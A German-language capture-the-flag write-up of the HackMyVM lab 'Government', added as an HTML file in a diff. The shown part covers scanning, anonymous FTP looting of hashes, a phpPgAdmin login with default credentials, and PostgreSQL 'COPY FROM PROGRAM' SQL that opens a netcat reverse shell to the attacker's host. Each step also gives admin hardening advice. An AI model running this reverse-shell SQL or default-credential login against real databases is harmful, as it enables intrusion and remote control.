@@ -1,0 +1,627 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Government - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <!-- Header-Farbe, Schwierigkeitsgrad-Farbe und Kreis-Farbe müssen in style.css angepasst werden (z.B. Gelb/Orange für Medium) -->
+    <div class="header-bg">
+        <h1>Government - HackMyVM - Level: Medium - Bericht</h1> <!-- Titel und Level angepasst -->
+        <div class="level-container">
+            <!-- Farbe muss in style.css angepasst werden -->
+            <h2>Medium</h2> <!-- Level angepasst -->
+            <div class="circle">
+                <!-- Segmentfarben müssen in style.css angepasst werden -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Inner-Farbe muss in style.css angepasst werden -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">lftp</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ffuf</div>
+                <div class="tool-item">psql (via phppgadmin)</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">strings</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">export</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept (Privilege Escalation)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>192.168.2.136	08:00:27:96:95:9d	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` sendet ARP-Requests ins lokale Netzwerk, um aktive Hosts zu identifizieren. Er listet die IP-Adresse, MAC-Adresse und den Hersteller der Netzwerkkarte auf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Wir haben die IP-Adresse des Ziels (192.168.2.136) erfolgreich identifiziert. Der Hersteller "PCS Systemtechnik GmbH" deutet stark auf eine VirtualBox-Umgebung hin, was für die Testszenarien typisch ist. Dies ist der erste Schritt, um das Ziel im Netzwerk zu lokalisieren.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die IP 192.168.2.136 als Ziel für weitere Scans verwenden, insbesondere Port-Scanning mit Nmap.<br><strong>Empfehlung (Admin):</strong> Sicherstellen, dass nur erwartete Geräte im Netzwerk aktiv sind. Netzwerksegmentierung kann die Sichtbarkeit von Geräten einschränken.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.136 -p-</span></div>
+                    <pre>Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-11 10:31 CEST
+Nmap scan report for government (192.168.2.136)
+Host is up (0.00018s latency).
+Not shown: 65524 closed tcp ports (reset)
+PORT      STATE SERVICE     VERSION
+<span class="command">21/tcp    open  ftp         vsftpd 3.0.3</span>
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ffff:192.168.2.140
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| drwxr-xr-x    2 0        0            4096 Sep 01  2021 files
+| drwxr-xr-x    2 0        0            4096 Aug 31  2021 government
+|_drwxr-xr-x    2 0        0            4096 Nov 14  2021 news
+<span class="command">22/tcp    open  ssh         OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)</span>
+| ssh-hostkey: 
+|   2048 0b:95:9a:37:ae:d8:b0:c0:23:78:eb:04:c2:9b:6c:41 (RSA)
+|   256 d4:a1:3b:a7:cc:e2:ea:ee:2e:6b:91:36:f9:be:da:6f (ECDSA)
+|_  256 22:9f:42:60:3d:56:20:15:3a:ff:7c:19:0d:20:ca:7a (ED25519)
+<span class="command">80/tcp    open  http        Apache httpd 2.4.25 ((Debian))</span>
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+| http-robots.txt: 2 disallowed entries 
+|_/login.php /admin
+<span class="command">111/tcp   open  rpcbind     2-4 (RPC #100000)</span>
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100003  3,4         2049/tcp   nfs
+|   100003  3,4         2049/tcp6  nfs
+|   100003  3,4         2049/udp   nfs
+|   100003  3,4         2049/udp6  nfs
+|   100005  1,2,3      35155/tcp   mountd
+|   100005  1,2,3      50024/udp6  mountd
+|   100005  1,2,3      56593/udp   mountd
+|   100005  1,2,3      57989/tcp6  mountd
+|   100021  1,3,4      37115/udp   nlockmgr
+|   100021  1,3,4      41987/tcp   nlockmgr
+|   100021  1,3,4      43019/tcp6  nlockmgr
+|   100021  1,3,4      54439/udp6  nlockmgr
+|   100227  3           2049/tcp   nfs_acl
+|   100227  3           2049/tcp6  nfs_acl
+|   100227  3           2049/udp   nfs_acl
+|_  100227  3           2049/udp6  nfs_acl
+<span class="command">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span>
+<span class="command">445/tcp   open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)</span>
+<span class="command">2049/tcp  open  nfs_acl     3 (RPC #100227)</span>
+<span class="command">33765/tcp open  mountd      1-3 (RPC #100005)</span>
+<span class="command">35155/tcp open  mountd      1-3 (RPC #100005)</span>
+<span class="command">36743/tcp open  mountd      1-3 (RPC #100005)</span>
+<span class="command">41987/tcp open  nlockmgr    1-4 (RPC #100021)</span>
+MAC Address: 08:00:27:96:95:9D (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.5.16-Debian)
+|   Computer name: government
+|   NetBIOS computer name: GOVERNMENT\x00
+|   Domain name: \x00
+|   FQDN: government
+|_  System time: 2022-10-11T10:31:59+02:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_nbstat: NetBIOS name: GOVERNMENT, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb2-time: 
+|   date: 2022-10-11T08:32:00
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+|_clock-skew: mean: -39m57s, deviation: 1h09m17s, median: 1s
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.18 ms government (192.168.2.136)</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan wird durchgeführt (`-sS` SYN-Scan, `-sC` Standardskripte, `-T5` schnelles Timing, `-sV` Versionserkennung, `-A` Aggressive Optionen, `-p-` alle Ports).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan enthüllt eine große Anzahl offener Ports und Dienste, was auf eine erhebliche Angriffsfläche hindeutet:
+                *   **Port 21 (FTP - vsftpd 3.0.3):** Anonymer Login ist erlaubt! Dies ist ein kritischer Fund, da er sofortigen Dateisystemzugriff ermöglicht. Drei Verzeichnisse (`files`, `government`, `news`) sind sichtbar.
+                *   **Port 22 (SSH - OpenSSH 7.4p1):** Standard-SSH-Dienst, relevant für späteren Zugriff oder Brute-Force.
+                *   **Port 80 (HTTP - Apache 2.4.25):** Webserver. Die `robots.txt` verbietet den Zugriff auf `/login.php` und `/admin`, was interessante Pfade sind.
+                *   **Port 111 (RPCBind) & Port 2049 (NFS):** Ein Network File System (NFS)-Dienst läuft. Dies ist ein weiterer wichtiger Vektor für Dateisystemzugriff, falls Shares exportiert werden. Die Ports für `mountd` und `nlockmgr` bestätigen dies.
+                *   **Port 139 & 445 (SMB - Samba 4.5.16):** Samba-Dienst für Windows-Dateifreigaben. Die Sicherheitseinstellungen (`message_signing: disabled`) sind als gefährlich markiert.
+            Die vielen offenen RPC-Dienste (mountd, nlockmgr) und die Kombination aus FTP, NFS und SMB bieten zahlreiche potenzielle Angriffspunkte.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                1.  **FTP (höchste Priorität):** Sofort anonym auf den FTP-Server verbinden und die Verzeichnisse `files`, `government`, `news` vollständig herunterladen und untersuchen.
+                2.  **NFS:** Mit `showmount -e 192.168.2.136` prüfen, welche Verzeichnisse exportiert werden und versuchen, diese zu mounten.
+                3.  **Web:** Die in `robots.txt` genannten Pfade (`/login.php`, `/admin`) und die mit Gobuster/ffuf gefundenen Pfade genauer untersuchen.
+                4.  **SMB:** Mit `smbclient -L 192.168.2.136` Shares auflisten und versuchen, mit Gastzugang oder bekannten Credentials darauf zuzugreifen.
+                <br><strong>Empfehlung (Admin):</strong>
+                1.  **FTP:** Anonymen FTP-Zugriff deaktivieren, es sei denn, er ist absolut notwendig und die freigegebenen Daten sind unkritisch. vsftpd aktualisieren.
+                2.  **NFS:** NFS nur verwenden, wenn nötig. Exporte auf bestimmte IP-Adressen beschränken und `no_root_squash` vermeiden.
+                3.  **Web:** Zugriff auf administrative Pfade einschränken (IP-Filter, Authentifizierung). Apache aktualisieren.
+                4.  **SMB:** Message Signing erzwingen (`message_signing = required` in `smb.conf`). Gastzugriff deaktivieren. Samba aktualisieren.
+                5.  Generell: Nicht benötigte Dienste (RPCBind, NFS, SMB, FTP) deaktivieren und Firewall-Regeln verschärfen, um nur notwendige Ports freizugeben.</p>
+
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.136 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,bak,7z,zip,py,sql,txt,xml,jpg,html -e --wildcard</span></div>
+                     <pre>
+<span class="command">http://192.168.2.136/index.html</span>           (Status: 200) [Size: 43]
+<span class="command">http://192.168.2.136/blog</span>                 (Status: 301) [Size: 313] [--> http://192.168.2.136/blog/]
+<span class="command">http://192.168.2.136/javascript</span>           (Status: 301) [Size: 319] [--> http://192.168.2.136/javascript/]
+<span class="command">http://192.168.2.136/robots.txt</span>           (Status: 200) [Size: 52]</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> `gobuster dir` wird verwendet, um nach Verzeichnissen und Dateien auf dem Webserver zu suchen. `-x` fügt spezifische Dateiendungen hinzu, `-e` zeigt vollständige URLs, und `--wildcard` wird verwendet, falls der Server für nicht existierende Seiten keine 404-Fehler liefert (obwohl Nmap bereits eine `robots.txt` gefunden hat, was dagegen spricht).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Gobuster findet die Startseite (`index.html`), die bereits bekannte `robots.txt` sowie die Verzeichnisse `/blog` und `/javascript`. Diese Verzeichnisse sollten genauer untersucht werden. Die in `robots.txt` genannten Pfade `/login.php` und `/admin` wurden hier nicht gefunden, was darauf hindeutet, dass sie entweder nicht existieren oder die verwendete Wortliste sie nicht enthält.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die gefundenen Verzeichnisse `/blog` und `/javascript` im Browser aufrufen und auf interessante Inhalte oder Funktionalitäten prüfen. Erneute Scans mit anderen Wortlisten (z.B. spezifisch für PHP-Dateien oder Admin-Pfade) könnten `/login.php` oder `/admin` aufdecken. Der Fokus sollte aber vorerst auf dem vielversprechenderen FTP-Zugang liegen.<br><strong>Empfehlung (Admin):</strong> Sicherstellen, dass keine sensiblen Informationen in Verzeichnissen wie `/blog` oder `/javascript` liegen. Zugriffskontrollen für administrative Bereiche wie `/admin` oder `/login.php` implementieren.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Inhalt der robots.txt, abgerufen über Gobuster oder manuell -->
+                     <pre>User-agent: *
+Disallow: /login.php
+Disallow: /admin</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Dies zeigt den Inhalt der `robots.txt`-Datei, die Suchmaschinen anweist, bestimmte Pfade nicht zu indizieren.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Datei verbietet das Crawlen von `/login.php` und `/admin`. Für einen Pentester sind dies jedoch *Hinweise* auf potenziell interessante Bereiche, die manuell untersucht werden sollten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen, `http://192.168.2.136/login.php` und `http://192.168.2.136/admin` direkt im Browser aufzurufen oder mit Tools wie `curl` zu untersuchen.<br><strong>Empfehlung (Admin):</strong> `robots.txt` ist kein Sicherheitsmechanismus. Administrative Bereiche müssen durch echte Zugriffskontrollen (Authentifizierung, Autorisierung, IP-Beschränkungen) geschützt werden.</p>
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">lftp -u anonymous,  192.168.2.136</span></div>
+                    <div class="prompt">lftp anonymous@192.168.2.136:~> <span class="command">ls</span></div>
+                    <pre>drwxr-xr-x    2 0        0            4096 Sep 01  2021 files
+drwxr-xr-x    2 0        0            4096 Aug 31  2021 government
+drwxr-xr-x    2 0        0            4096 Nov 14  2021 news</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Mit dem Kommandozeilen-FTP-Client `lftp` wird eine anonyme Verbindung zum FTP-Server auf 192.168.2.136 hergestellt (`-u anonymous,`). Der Befehl `ls` listet die Verzeichnisse im Stammverzeichnis des FTP-Servers auf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der anonyme Zugriff funktioniert wie von Nmap vorhergesagt. Die Verzeichnisse `files`, `government` und `news` sind sichtbar und wahrscheinlich der nächste Schritt zur Informationsgewinnung.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Inhalt dieser Verzeichnisse rekursiv herunterladen und untersuchen. Der Befehl `wget -m ftp://anonymous@192.168.2.136/` oder `lftp`'s `mirror`-Befehl eignen sich dafür.<br><strong>Empfehlung (Admin):</strong> Anonymen FTP-Zugriff deaktivieren oder stark einschränken und sicherstellen, dass keine sensiblen Daten darüber zugänglich sind.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget -m ftp://192.168.2.136</span></div>
+                    <pre>--2022-10-11 10:35:39--  ftp://192.168.2.136/
+           => »192.168.2.136/.listing«
+<span class="password">Verbindungsaufbau zu 192.168.2.136:21 … verbunden.</span>
+<span class="password">Anmelden als anonymous … Angemeldet!</span>
+> SYST ... fertig.    > PWD ... fertig.
+> TYPE I ... fertig.  > CWD nicht notwendig.
+> PASV ... fertig.    > LIST ... fertig.
+<span class="password">[... Download der Verzeichnisse ...]</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `wget -m ftp://192.168.2.136` wird verwendet, um den gesamten Inhalt des anonymen FTP-Servers rekursiv herunterzuladen (`-m` steht für mirror).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Download war erfolgreich. Alle Dateien aus den Verzeichnissen `files`, `government` und `news` sind nun lokal auf dem Angreifer-System verfügbar und können analysiert werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die heruntergeladenen Dateien, insbesondere im Verzeichnis `files`, gründlich untersuchen.<br><strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlung bezüglich anonymem FTP.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cd 192.168.2.136/files</span></div>
+                    <div class="prompt">┌──(root㉿cyber)-[~/192.168.2.136/files]
+└─# <span class="command">ll</span></div>
+                    <pre>insgesamt 12
+-rw-r--r-- 1 root root 179 31. Aug 2021  encrypt.txt
+-rw-r--r-- 1 root root 217 31. Aug 2021  old.txt
+-rw-r--r-- 1 root root 158 31. Aug 2021  remove.txt</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Pentester wechselt in das lokal heruntergeladene Verzeichnis `192.168.2.136/files` und listet dessen Inhalt mit `ll` (Alias für `ls -l`) auf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Drei Textdateien (`encrypt.txt`, `old.txt`, `remove.txt`) wurden gefunden. Diese scheinen relevant zu sein und müssen untersucht werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Inhalt der drei Dateien mit `cat *.txt` oder einzeln anzeigen.<br><strong>Empfehlung (Admin):</strong> Keine sensiblen oder informativen Dateien auf öffentlich zugänglichen FTP-Servern ablegen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/192.168.2.136/files]
+└─# <span class="command">cat *.txt</span></div>
+                    <pre><span class="password">//Attention: 
+
+-- Password are encrypted in MD5 -- 
+
+Change the encryption with (Blowfish or Tryple DES)
+
+//After this operation , delete this file.
+
+
+- Government Policy & Rules</span>
+<span class="password">//Old password removed - 
+
+7c8e2414a014851ef13527070ce37ede
+
+b20a6dc6c921e4d2fb49bda509b77c46
+
+36c0ae2711103178a07506f0f6f18c66
+
+480a808105b6fff3f0a57a4a4e74cb7d
+
+//Please remove this file
+
+-Government Policy & Rules</span>
+<span class="password">//Remove this old employee from database
+
+#emma 
+#christian
+#luds
+#malic
+#susan
+
+//After removing this user - Remove this file
+
+
+- Governament Policy & Rules</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `cat *.txt` gibt den Inhalt aller drei `.txt`-Dateien (`encrypt.txt`, `old.txt`, `remove.txt`) hintereinander aus.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein Goldfund! Die Dateien enthalten wichtige Informationen:
+                *   **Passwörter:** Es gibt einen Hinweis, dass Passwörter als MD5 gespeichert sind, und es werden vier MD5-Hashes aufgelistet (`7c8e...`, `b20a...`, `36c0...`, `480a...`). Diese müssen versucht werden zu knacken.
+                *   **Benutzernamen:** Es wird eine Liste von (vermutlich ehemaligen) Mitarbeiternamen genannt: `emma`, `christian`, `luds`, `malic`, `susan`. Diese könnten als Benutzernamen für SSH, Web-Login oder andere Dienste relevant sein.
+                *   **Kontext:** Die Kommentare deuten auf interne Prozesse und Richtlinien hin ("Government Policy & Rules") und dass diese Dateien eigentlich hätten gelöscht werden sollen.
+            Die Kombination aus Benutzernamen und Passwort-Hashes ist ein klarer Weg zum initialen Zugriff.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                1.  Versuchen, die MD5-Hashes mit Online-Crackern (z.B. Crackstation) oder Offline-Tools (Hashcat, John the Ripper) zu knacken.
+                2.  Die Benutzernamen (`emma`, `christian`, `luds`, `malic`, `susan`) in Kombination mit den geknackten Passwörtern oder Standardpasswörtern gegen SSH (Port 22) und den Web-Login (`/login.php`) testen.
+                <br><strong>Empfehlung (Admin):</strong> Solche Dateien dürfen niemals auf einem FTP-Server landen, schon gar nicht mit anonymem Zugriff. Interne Prozesse zur Datenlöschung müssen sicherstellen, dass sensible Informationen tatsächlich entfernt werden. Passwörter sollten niemals als MD5 gespeichert werden (verwenden Sie moderne, gesalzene Hashing-Algorithmen wie bcrypt oder Argon2). Benutzerkonten ehemaliger Mitarbeiter sollten umgehend deaktiviert oder gelöscht werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/192.168.2.136/files]
+└─# <span class="command">ffuf -ic -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u 'http://gov.hmv/FUZZ' -e .html,.txt,.php -of html -o dir-raft.html</span></div>
+                    <pre> 
+<span class="command">blog</span>                    [Status: 301, Size: 301, Words: 20, Lines: 10, Duration: 0ms]
+<span class="command">javascript</span>              [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 0ms]
+<span class="command">index.html</span>              [Status: 200, Size: 43, Words: 6, Lines: 3, Duration: 0ms]
+<span class="command">robots.txt</span>              [Status: 200, Size: 52, Words: 4, Lines: 4, Duration: 0ms]
+<span class="command">server-status</span>           [Status: 403, Size: 272, Words: 20, Lines: 10, Duration: 0ms]
+                        [Status: 200, Size: 43, Words: 6, Lines: 3, Duration: 0ms]
+.html                   [Status: 403, Size: 272, Words: 20, Lines: 10, Duration: 0ms]
+.php                    [Status: 403, Size: 272, Words: 20, Lines: 10, Duration: 0ms]
+                        [Status: 200, Size: 43, Words: 6, Lines: 3, Duration: 0ms]
+.php                    [Status: 403, Size: 272, Words: 20, Lines: 10, Duration: 0ms]
+.html                   [Status: 403, Size: 272, Words: 20, Lines: 10, Duration: 1ms]
+<span class="command">index.html</span>              [Status: 200, Size: 43, Words: 6, Lines: 3, Duration: 5ms]
+<span class="command">phppgadmin</span>              [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 2ms]
+.html                   [Status: 403, Size: 272, Words: 20, Lines: 10, Duration: 1ms]
+.php                    [Status: 403, Size: 272, Words: 20, Lines: 10, Duration: 3ms]
+                        [Status: 200, Size: 43, Words: 6, Lines: 3, Duration: 6ms]
+<span class="password">:: Progress: [249136/249136]  Job [1/1]  5800 req/sec  Duration: [0:00:18]  Errors: 12 ::</span></pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `ffuf` wird für weiteres Directory/File-Fuzzing eingesetzt.
+                 *   `-ic`: Ignoriert Kommentare in der Wortliste.
+                 *   `-c`: Farbige Ausgabe.
+                 *   `-w ...raft-large-directories.txt`: Verwendet eine große Wortliste.
+                 *   `-u 'http://gov.hmv/FUZZ'`: Fuzzt auf dem Hostnamen `gov.hmv` (dieser muss vorher in `/etc/hosts` eingetragen worden sein, ähnlich wie im vorherigen Report). `FUZZ` ist der Platzhalter.
+                 *   `-e .html,.txt,.php`: Fügt diese Endungen hinzu.
+                 *   `-of html -o dir-raft.html`: Speichert die Ausgabe im HTML-Format.
+             </p>
+            <p class="evaluation"><strong>Bewertung:</strong> Neben den bereits mit Gobuster gefundenen Pfaden (`blog`, `javascript`, `index.html`, `robots.txt`) entdeckt `ffuf` einen sehr interessanten Pfad: `/phppgadmin`. phpPgAdmin ist eine webbasierte Administrationskonsole für PostgreSQL-Datenbanken. Dies ist ein potenziell kritischer Fund, da Fehlkonfigurationen oder Standard-Logins oft den Zugriff auf die Datenbank ermöglichen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sofort `http://gov.hmv/phppgadmin/` im Browser aufrufen. Versuchen, sich mit Standard-Credentials für PostgreSQL (`postgres:postgres`, `postgres:password`, `postgres:admin` etc.) anzumelden. Wenn Zugangsdaten aus den FTP-Dateien geknackt wurden, diese ebenfalls testen.<br><strong>Empfehlung (Admin):</strong> Webbasierte Datenbank-Admin-Tools wie phpPgAdmin sollten niemals öffentlich zugänglich sein. Der Zugriff muss stark eingeschränkt werden (z.B. nur über VPN, IP-Whitelisting, starke Authentifizierung). Standardpasswörter müssen unbedingt geändert werden.</p>
+
+            <!-- Hier beginnt der Exploit-Teil, der zum Initial Access führt -->
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Manuelle Beschreibung aus dem Text -->
+                    <pre>vulnerabel: http://192.168.2.136/phppgadmin/
+exploit:    https://www.exploit-db.com/exploits/49736
+
+linke Seite link <PostGreSQL>
+-------------------------------
+name:<span class="command">postgres</span>
+pass:<span class="password">admin</span>
+
+datenbank:
+
+Spalte 	Datentyp                                         	 
+arianna  [pk] 	 arianna1	<span class="password">f7a3182518d6c18548d39b87450970af</span> 
+elisa    [pk] 	 elisa35 	<span class="password">ac9deed070d7eeb6a15abd909c751f79</span>
+lukas    [pk]  	 lukas123    <span class="password">c938489ddb8330955c187d62e032bb43</span>
+mike     [pk] 	 nevergiveup1	<span class="password">b3acafa9035c7793982b9dafcf8714ae</span>
+raphael  pk] 	 raphael777	<span class="password">09db36a8dce311355d6755c8c99a5dc1</span>
+
+dann rechts oben in der Leiste auf SQL klicken und Befehl ausführen:
+
+<span class="command">DROP TABLE IF EXISTS cmd_exec;</span>
+<span class="command">CREATE TABLE cmd_exec(cmd_output text);</span>
+<span class="command">COPY cmd_exec FROM PROGRAM 'nc -e /bin/bash 192.168.2.117 9001';</span>
+<span class="command">SELECT * FROM cmd_exec;</span></pre> <!-- Stern hinzugefügt -->
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Dieser Abschnitt beschreibt den Zugriff auf phpPgAdmin und die Ausnutzung einer Schwachstelle oder Funktion zur Codeausführung.
+                 1.  Die URL `/phppgadmin/` wird als verwundbar identifiziert. Ein Exploit-DB-Link wird genannt, aber der tatsächliche Zugriff scheint über Standard-Credentials zu erfolgen.
+                 2.  Es wird sich erfolgreich mit dem Benutzernamen `postgres` und dem Passwort `<span class="password">admin</span>` bei der PostgreSQL-Datenbank angemeldet.
+                 3.  Innerhalb von phpPgAdmin wird eine Tabelle (vermutlich `users` oder ähnlich) gefunden, die Benutzernamen und weitere Passwort-Hashes enthält (arianna, elisa, lukas, mike, raphael). Diese könnten relevant sein, werden aber hier nicht direkt weiterverwendet.
+                 4.  Die entscheidende Aktion ist die Ausführung von SQL-Befehlen. PostgreSQL erlaubt es unter bestimmten Umständen (als Superuser wie `postgres`), Betriebssystembefehle über `COPY ... FROM PROGRAM` auszuführen.
+                 5.  Es wird eine temporäre Tabelle `cmd_exec` erstellt.
+                 6.  Der Befehl `COPY cmd_exec FROM PROGRAM 'nc -e /bin/bash 192.168.2.117 9001';` wird ausgeführt. Dies weist PostgreSQL an, das Programm `/bin/nc` (netcat) zu starten, welches wiederum eine Bash-Shell (`-e /bin/bash`) startet und diese mit einem TCP-Listener auf dem Angreifer-System (192.168.2.117, Port 9001) verbindet. Dies ist eine Reverse Shell.
+                 7.  `SELECT * FROM cmd_exec;` wird ausgeführt, um die Ausgabe des Befehls abzurufen (was bei einer Reverse Shell meist leer ist oder eine Fehlermeldung gibt, während die Shell im Hintergrund läuft).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist der erfolgreiche Weg zum initialen Zugriff! Die Kombination aus einem öffentlich zugänglichen phpPgAdmin-Interface und schwachen Standard-Credentials (`postgres:admin`) ermöglichte die Ausführung von Betriebssystembefehlen als der Datenbankbenutzer `postgres`. Die `COPY FROM PROGRAM`-Funktion ist ein bekannter Weg zur Codeausführung in PostgreSQL, wenn man über ausreichende Rechte verfügt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Auf dem Angreifer-System (192.168.2.117) muss ein Netcat-Listener auf Port 9001 gestartet werden (`nc -lvnp 9001`), *bevor* der SQL-Befehl ausgeführt wird, um die eingehende Reverse Shell zu empfangen. Die neuen Passwort-Hashes aus der Datenbank könnten für andere Benutzer nützlich sein, falls der `postgres`-Zugriff eingeschränkt ist.<br><strong>Empfehlung (Admin):</strong> Sofort den Zugriff auf phpPgAdmin absichern (siehe vorherige Empfehlung). Das Standardpasswort für den `postgres`-Benutzer ändern! Die Berechtigungen des `postgres`-Benutzers überprüfen und einschränken, insbesondere die Fähigkeit, `COPY ... FROM PROGRAM` auszuführen (dies erfordert normalerweise Superuser-Rechte). PostgreSQL und phpPgAdmin auf aktuelle Versionen patchen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/192.168.2.136/files]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.140] from (UNKNOWN) [192.168.2.136] 55954</span></pre>
+                     <!-- Hier fehlt der Prompt der Reverse Shell, z.B. postgres@government -->
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System wird der Netcat-Listener gestartet. Kurz darauf kommt eine Verbindung vom Zielsystem (192.168.2.136) herein. Die angezeigte Quell-IP des Angreifers (192.168.2.140) weicht von der im SQL-Befehl (192.168.2.117) ab - dies ist wahrscheinlich ein Tippfehler im Bericht.</p>
